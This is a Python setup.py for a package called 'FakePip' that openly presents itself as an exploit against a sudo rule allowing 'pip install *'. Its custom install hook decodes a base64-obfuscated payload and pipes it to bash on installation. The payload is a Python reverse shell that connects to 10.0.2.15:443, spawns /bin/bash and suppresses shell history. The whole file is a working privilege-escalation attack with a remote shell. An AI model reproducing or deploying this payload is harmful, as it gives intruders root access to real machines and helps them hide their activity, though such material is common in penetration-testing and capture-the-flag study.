from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        os.system('echo cHl0aG9uIC1jICJpbXBvcnQgb3M7IGltcG9ydCBwdHk7IGltcG9ydCBzb2NrZXQ7IGxob3N0ID0gJzEwLjAuMi4xNSc7IGxwb3J0ID0gNDQzOyBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KChsaG9zdCwgbHBvcnQpKTsgb3MuZHVwMihzLmZpbGVubygpLCAwKTsgb3MuZHVwMihzLmZpbGVubygpLCAxKTsgb3MuZHVwMihzLmZpbGVubygpLCAyKTsgb3MucHV0ZW52KCdISVNURklMRScsICcvZGV2L251bGwnKTsgcHR5LnNwYXduKCcvYmluL2Jhc2gnKTsgcy5jbG9zZSgpOyIg|base64 -d|bash')

setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install':CustomInstall})
